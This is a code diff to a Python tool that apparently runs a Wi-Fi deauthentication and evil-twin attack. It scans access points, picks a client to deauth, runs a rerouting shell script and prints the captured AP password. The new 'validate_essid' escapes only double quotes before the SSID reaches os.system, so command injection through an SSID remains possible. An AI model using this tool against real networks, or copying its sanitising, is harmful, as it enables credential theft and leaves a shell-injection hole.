@@ -46,7 +46,8 @@ def retry_on_error(max_retries):
                     attempts += 1
                     print(f"Retrying... ({attempts}/{max_retries})")
                     time.sleep(1)
-            raise Exception(f"Failed after {max_retries} attempts")
+            print (f"Failed reading password after {max_retries} attempts")
+            return None
         return wrapper
     return decorator_func
 
@@ -86,6 +87,18 @@ def callback(packet):
         # get the crypto
         crypto = stats.get("crypto")
         networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
+
+def validate_essid(essid):
+    new_essid = '\"'
+    for c in essid:
+        if c == '"':
+            new_essid += '\\"'
+        else:
+            new_essid += c
+    new_essid += '\"'
+    return new_essid
+
+
 
 
 def print_APs():
@@ -178,7 +191,11 @@ if __name__ == "__main__":
     sniff(prn=get_AP_clients, monitor=True, timeout=20)
     isSniffing = False  # for the change_channel thread
 
-    os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")
+    if len(clients) == 0:
+        logger.info("There is not clients on the Access point you choose, Please run again and choose another one")
+        exit(0)
+
+    os.system(f"./rerouting_magic.sh --ssid {validate_essid(ssid_to_scan)}")
 
     # start the thread that prints all the connected clients
     printer = Thread(target=check_for_connection)
@@ -186,6 +203,7 @@ if __name__ == "__main__":
     printer.start()
 
     logger.info("please choose a client MAC to deauth: ")
+
     # clients set to list
     clients = list(clients)
     terminal_menu = TerminalMenu(clients)
@@ -199,5 +217,6 @@ if __name__ == "__main__":
     # TODO: print the ap password
 
     result = read_nohup_output()
-    print(result)
+    if result:
+        print(result)
     # pdb.set_trace()
